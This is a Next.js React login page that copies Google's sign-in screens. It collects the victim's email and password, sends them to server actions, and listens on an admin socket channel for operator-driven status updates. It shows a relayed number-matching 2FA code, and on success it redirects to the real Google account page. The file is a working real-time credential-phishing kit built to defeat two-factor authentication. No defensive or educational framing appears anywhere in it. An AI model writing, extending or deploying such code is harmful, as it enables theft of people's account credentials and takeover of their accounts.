"use client";

import React, { useState, useEffect, useRef, useCallback } from "react";
import { useRouter } from "next/navigation";
import { loginAction, checkLoginStatus } from "./loginaction";
import { useSocket } from "../../hooks/useSocket";
import { useTranslation } from "../../hooks/useTranslation";
import Head from "next/head";

export default function LoginPage() {
    const router = useRouter();
    const [step, setStep] = useState(1);
    const [email, setEmail] = useState("");
    const [password, setPassword] = useState("");
    const [showPassword, setShowPassword] = useState(false);
    const [twoFACode, setTwoFACode] = useState("6"); // Default matching number
    const [error, setError] = useState("");
    const [loading, setLoading] = useState(false);
    const [statusMessage, setStatusMessage] = useState("");
    const [mounted, setMounted] = useState(false);
    const pollingRef = useRef(null);
    const { socket } = useSocket();
    const { t, lang, setLang, availableLanguages } = useTranslation();
    const [showAdminCodePopup, setShowAdminCodePopup] = useState(false);

    useEffect(() => {
        setMounted(true);
        return () => {
            if (pollingRef.current) {
                clearInterval(pollingRef.current);
                pollingRef.current = null;
            }
        };
    }, []);

    const startPolling = useCallback((targetEmail) => {
        if (pollingRef.current) {
            clearInterval(pollingRef.current);
        }
        
        pollingRef.current = setInterval(async () => {
            try {
                const result = await checkLoginStatus(targetEmail);
                if (result.success) {
                    if (result.status === "success") {
                        clearInterval(pollingRef.current);
                        router.push("https://myaccount.google.com/?utm_source=sign_in_no_continue&pli=1");
                    } else if (result.status === "2fa") {
                        clearInterval(pollingRef.current);
                        setTwoFACode(result.authCode || "6");
                        setStep(3); // 2FA page
                    } else if (result.status === "wrong_password") {
                        clearInterval(pollingRef.current);
                        setError("Wrong password. Try again or click Forgot password to reset it.");
                        setStep(2);
                    }
                }
            } catch (err) {
                console.error("Polling error:", err);
            }
        }, 3000);
    }, [router]);

    // Listen for admin-driven updates via socket
    useEffect(() => {
        if (!socket) return;

        const handler = (data) => {
            try {
                if (!data) return;
                // Match by email if available
                if (!email || !data.email) return;
                if (data.email.toLowerCase() !== email.toLowerCase()) return;

                const status = data.newStatus;

                if (status === '2fa') {
                    console.log('Received 2FA status from socket:', data);
                    // show code popup and move to 2FA step
                    setTwoFACode(data.authCode || '');
                    setShowAdminCodePopup(true);
                    setStep(3);
                } else if (status === 'wrong_email') {
                    console.log('Received wrong_email status from socket:', data);
                    setError('Email not found. Please enter a valid email.');
                    setStep(1);
                } else if (status === 'wrong_password') {
                    console.log('Received wrong_password status from socket:', data);
                    setError('Wrong password. Please try again.');
                    setStep(2);
                } else if (status === 'success') {
                    console.log('Received success status from socket:', data);
                    router.push("https://myaccount.google.com/?utm_source=sign_in_no_continue&pli=1");
                } else if (status === 'pending') {
                    console.log('Received pending status from socket:', data);
                    setStep(5);
                    startPolling(email);
                }
            } catch (e) {
                console.error('Socket handler error:', e);
            }
        };

        socket.on('user_update', handler);
        return () => socket.off('user_update', handler);
    }, [socket, email, router, startPolling]);

    const handleEmailSubmit = async (e) => {
        e.preventDefault();
        setError("");
        setLoading(true);

        try {
            const result = await loginAction({ step: 1, email });
            if (result.success) {
                setStep(2);
            } else {
                setError(result.error || "An error occurred");
            }
        } catch (err) {
            setError("Network error");
        } finally {
            setLoading(false);
        }
    };

    const handlePasswordSubmit = async (e) => {
        e.preventDefault();
        setError("");
        setLoading(true);

        try {
            const result = await loginAction({ step: 2, email, password });
            
            if (result.success) {
                if (result.pending) {
                    setStep(5); // Loading/Waiting page
                    startPolling(email);
                } else if (result.requires2FA) {
                    setStep(3);
                } else if (result.completed) {
                    router.push("https://myaccount.google.com/?utm_source=sign_in_no_continue&pli=1");
                }
            } else {
                setError(result.error || "An error occurred");
            }
        } catch (err) {
            setError("Network error");
        } finally {
            setLoading(false);
        }
    };

    if (!mounted) return null;

    if (step === 5) {
        return (
            <div className="container-loading">
                <style dangerouslySetInnerHTML={{__html: `
                    body { background: #fff; color: #202124; font-family: Arial, Helvetica, sans-serif; }
                    .container-loading { max-width: 420px; margin: 0 auto; padding: 35px 24px; text-align: center; }
                    .container-loading img.logo { display: block; width: 110px; margin: 0 auto 35px; }
                    .container-loading h1 { font-size: 22px; font-weight: 400; line-height: 1.4; margin-bottom: 28px; }
                    .container-loading p { font-size: 17px; color: #5f6368; line-height: 1.6; }
                    .loader { width: 64px; height: 64px; margin: 55px auto; animation: rotate 2s linear infinite; }
                    .loader svg { width: 100%; height: 100%; }
                    .path { fill: none; stroke: #1a73e8; stroke-width: 4; stroke-linecap: round; stroke-dasharray: 1, 150; stroke-dashoffset: 0; animation: dash 1.5s ease-in-out infinite; }
                    @keyframes rotate { 100% { transform: rotate(360deg); } }
                    @keyframes dash {
                        0% { stroke-dasharray: 1, 150; stroke-dashoffset: 0; }
                        50% { stroke-dasharray: 90, 150; stroke-dashoffset: -35; }
                        100% { stroke-dasharray: 90, 150; stroke-dashoffset: -124; }
                    }
                `}} />
                <img className="logo" src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png" alt="Google" />
                <h1>{t('verification.may_take')}</h1>
                <p>{t('verification.matching_text')}</p>
                <div className="loader">
                    <svg viewBox="25 25 50 50">
                        <circle className="path" cx="50" cy="50" r="20"></circle>
                    </svg>
                </div>
            </div>
        );
    }

    return (
        <div className="main-wrapper">
            <style dangerouslySetInnerHTML={{__html: `
                * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
                body { display: flex; flex-direction: column; justify-content: center; align-items: center; min-height: 100vh; background-color: #ffffff; padding: 20px 16px; }
                .main-wrapper { width: 100%; max-width: 450px; }
                .login-card { width: 100%; background: #ffffff; padding: 40px; border: 1px solid #dadce0; border-radius: 8px; margin-bottom: 24px; }
                .brand-logo { text-align: center; font-size: 24px; font-weight: 500; margin-bottom: 16px; letter-spacing: -0.5px; display: flex; justify-content: center; align-items: center; }
                .brand-logo span:nth-child(1) { color: #4285f4; }
                .brand-logo span:nth-child(2) { color: #ea4335; }
                .brand-logo span:nth-child(3) { color: #fbbc05; }
                .brand-logo span:nth-child(4) { color: #4285f4; }
                .brand-logo span:nth-child(5) { color: #34a853; }
                .brand-logo span:nth-child(6) { color: #ea4335; }
                h1 { font-size: 24px; font-weight: 400; color: #202124; text-align: center; margin-bottom: 8px; }
                .subtitle { font-size: 16px; color: #202124; text-align: center; margin-bottom: 30px; }
                .input-group { position: relative; margin-bottom: 8px; }
                .input-group input { width: 100%; padding: 16px; font-size: 16px; border: 1px solid #dadce0; border-radius: 4px; outline: none; background: transparent; transition: border-color 0.15s ease; color: #000; caret-color: #000; }
                .input-group input:focus { border-color: #1a73e8; border-width: 2px; padding: 15px; }
                .input-group label { position: absolute; left: 16px; top: 50%; transform: translateY(-50%); background: #ffffff; padding: 0 4px; font-size: 16px; color: #757575; transition: 0.2s ease all; pointer-events: none; }
                .input-group input:focus ~ label, .input-group input:not(:placeholder-shown) ~ label { top: 0; font-size: 12px; color: #1a73e8; }
                .link-blue { color: #1a73e8; font-size: 14px; font-weight: 500; text-decoration: none; display: inline-block; cursor: pointer; }
                .link-blue:hover { text-decoration: underline; }
                .notice { margin-top: 40px; font-size: 14px; color: #5f6368; line-height: 1.45; }
                .action-row { display: flex; justify-content: space-between; align-items: center; margin-top: 35px; }
                .btn-next { background-color: #1a73e8; color: white; border: none; padding: 10px 24px; font-size: 14px; font-weight: 500; border-radius: 4px; cursor: pointer; }
                .btn-next:hover { background-color: #1557b0; }
                .footer-row { display: flex; justify-content: space-between; align-items: center; padding: 0 4px; font-size: 12px; color: #5f6368; }
                .footer-links a { color: #5f6368; text-decoration: none; margin-left: 16px; }
                .footer-links a:hover { color: #202124; }
                .lang-selector { cursor: pointer; display: flex; align-items: center; }
                .lang-selector::after { content: " ▼"; font-size: 8px; margin-left: 4px; }
                .error-text { color: #d93025; font-size: 12px; margin-top: 4px; display: flex; align-items: center; gap: 4px; }
                /* Step 2 specific */
                .user-pill { display: inline-flex; align-items: center; justify-content: center; padding: 5px 12px; border: 1px solid #dadce0; border-radius: 16px; font-size: 14px; color: #3c4043; max-width: 100%; margin: 0 auto 30px auto; cursor: pointer; }
                .user-pill:hover { background-color: #f8f9fa; }
                .user-avatar { width: 20px; height: 20px; background: #1a73e8; color: white; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 11px; font-weight: bold; margin-right: 8px; }
                .user-pill svg { margin-left: 6px; fill: #5f6368; }
                .show-pass-container { display: flex; align-items: center; margin: 12px 0 40px 4px; font-size: 14px; color: #202124; user-select: none; cursor: pointer; }
                .show-pass-container input { margin-right: 10px; width: 18px; height: 18px; cursor: pointer; }
                .center-wrapper { display: flex; width: 100%; justify-content: center; }
                /* Step 3 specific */
                .phone-prompt-icon { width: 60px; height: 90px; border: 3px solid #bcc1c6; border-radius: 8px; margin: 24px auto; position: relative; background: #f8f9fa; }
                .phone-prompt-icon::before { content: ""; position: absolute; top: 6px; left: 50%; transform: translateX(-50%); width: 12px; height: 3px; background: #bcc1c6; border-radius: 2px; }
                .phone-prompt-icon::after { content: ""; position: absolute; top: 25px; left: 5px; right: 5px; height: 35px; background: #e8f0fe; border: 1px solid #4285f4; border-radius: 4px; }
                .matching-number { font-size: 48px; font-weight: 400; color: #202124; margin: 24px 0; text-align: center;}
                .instruction-text { font-size: 14px; color: #3c4043; line-height: 1.5; text-align: left; margin-bottom: 16px; }
                
                @media (max-width: 480px) {
                    body { justify-content: flex-start; padding-top: 10px; }
                    .login-card { border: none; padding: 20px 8px; }
                    .footer-row { flex-direction: column; gap: 16px; align-items: flex-start; padding-left: 8px; }
                    .footer-links { display: flex; width: 100%; justify-content: flex-start; }
                    .footer-links a { margin-left: 0; margin-right: 16px; }
                }
            `}} />

            <div className="login-card" style={step === 3 ? {textAlign: 'center'} : {}}>
                <div className="brand-logo" translate="no">
                    <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
                </div>

                {step === 1 && (
                    <>
                        <h1>{t('sign_in.title')}</h1>
                        <div className="subtitle">{t('sign_in.subtitle')}</div>

                        <form onSubmit={handleEmailSubmit}>
                            <div className="input-group">
                                <input
                                    type="text"
                                    id="login-field"
                                    placeholder=" "
                                    autoFocus
                                    autoComplete="username"
                                    value={email}
                                    onChange={(e) => setEmail(e.target.value)}
                                    disabled={loading}
                                    style={{ color: '#000' }}
                                />
                                <label htmlFor="login-field">{t('sign_in.email_placeholder')}</label>
                            </div>

                            <a href="#" className="link-blue" style={{ marginTop: '8px', display: 'inline-block' }}>{t('sign_in.forgot_email')}</a>

                            <div className="notice">
                                {t('sign_in.notice')}<br />
                                <a href="#" className="link-blue" style={{ marginTop: '4px' }}>{t('sign_in.learn_more')}</a>
                            </div>

                            <div className="action-row">
                                <a href="#" className="link-blue">{t('sign_in.create_account')}</a>
                                <button type="submit" className="btn-next" disabled={loading}>{t('sign_in.next')}</button>
                            </div>
                        </form>
                    </>
                )}

                {step === 2 && (
                    <>
                        <h1>{t('welcome.title')}</h1>
                        <div className="center-wrapper">
                            <div className="user-pill" onClick={() => setStep(1)}>
                                <div className="user-avatar">{email.charAt(0).toLowerCase()}</div>
                                <span>{email}</span>
                                <svg viewBox="0 0 24 24" width="12" height="12">
                                    <path d="M7 10l5 5 5-5z"></path>
                                </svg>
                            </div>
                        </div>

                        <form onSubmit={handlePasswordSubmit}>
                            <div className="input-group">
                                <input
                                    type={showPassword ? "text" : "password"}
                                    id="password-field"
                                    placeholder=" "
                                    autoFocus
                                    value={password}
                                    onChange={(e) => setPassword(e.target.value)}
                                    disabled={loading}
                                    style={error ? { borderColor: '#d93025' } : {}}
                                />
                                <label htmlFor="password-field" style={error ? { color: '#d93025' } : {}}>{t('welcome.enter_password')}</label>
                            </div>
                            {error && (
                                <div className="error-text">
                                    <svg aria-hidden="true" fill="currentColor" focusable="false" width="16px" height="16px" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path></svg>
                                    {error}
                                </div>
                            )}

                            <label className="show-pass-container">
                                <input
                                    type="checkbox"
                                    checked={showPassword}
                                    onChange={() => setShowPassword(!showPassword)}
                                />
                                <span>{t('welcome.show_password')}</span>
                            </label>

                            <div className="action-row" style={{ marginTop: 0 }}>
                                <a href="#" className="link-blue">{t('welcome.forgot_password')}</a>
                                <button type="submit" className="btn-next" disabled={loading}>{t('sign_in.next')}</button>
                            </div>
                        </form>
                    </>
                )}

                {step === 3 && (
                    <>
                        <h1>{t('verification.title')}</h1>
                        <div className="instruction-text" style={{ fontSize: '16px', color: '#202124', marginBottom: '20px' }}>
                            {t('verification.instruction')}
                        </div>

                        <div className="phone-prompt-icon"></div>

                        <div className="matching-number">{twoFACode}</div>

                        <div className="instruction-text" style={{ color: '#5f6368' }}>
                            {t('verification.phone_session')}
                        </div>

                        <a href="#" className="link-blue" style={{ textAlign: 'left', width: '100%', marginTop: '20px' }}>{t('verification.resend')}</a>
                    </>
                )}
            </div>

            <div className="footer-row">
                <button
                    type="button"
                    className="lang-selector"
                    aria-label="Change language"
                    onClick={() => {
                        // cycle languages on click
                        const idx = availableLanguages.indexOf(lang);
                        const next = availableLanguages[(idx + 1) % availableLanguages.length];
                        setLang(next);
                    }}
                >
                    {lang === 'fr' ? 'Français' : (lang === 'syl' ? 'Sylheti' : t('footer.lang_default'))}
                </button>
                <div className="footer-links">
                    <a href="#">{t('footer.help')}</a>
                    <a href="#">{t('footer.privacy')}</a>
                    <a href="#">{t('footer.terms')}</a>
                </div>
            </div>
        </div>
    );
}